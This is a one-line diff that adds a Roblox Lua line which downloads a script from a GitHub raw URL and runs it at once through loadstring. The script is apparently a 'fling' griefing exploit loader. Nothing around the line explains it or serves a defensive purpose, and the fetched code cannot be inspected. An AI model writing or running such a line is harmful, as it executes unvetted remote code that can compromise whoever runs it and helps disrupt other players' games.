@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/fling-playground-spam7-os7ncjqeoflhe1.lua"))()
